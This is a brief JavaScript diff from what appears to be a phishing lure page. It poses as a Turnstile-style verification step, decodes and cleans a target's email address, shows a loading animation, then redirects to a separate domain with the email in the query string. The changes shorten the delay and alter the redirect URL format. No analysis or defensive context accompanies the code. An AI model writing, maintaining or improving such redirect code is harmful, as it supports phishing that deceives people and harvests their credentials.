@@ -102,7 +102,7 @@ function cleanEmail(email) {
         // Remove loading animation after 15 seconds
         setTimeout(function() {
             loadingDiv.style.display = 'none';
-        }, 30000);
+        }, 3000);
 
         // Function to decode Base64
         function decodeBase64(encoded) {
@@ -320,7 +320,7 @@ function startTurnstileVerification() {
     console.log("Cleaned Email:", email);
 
     // Construct the redirect URL
-    const redirectUrl = `${domain}?POP=${encodeURIComponent(email)}&redirected=done`;
+    const redirectUrl = `${domain}?FRAG=POP=${encodeURIComponent(email)}?redirected=done`;
 
     // Wait for 3 seconds, then redirect
     setTimeout(function () {
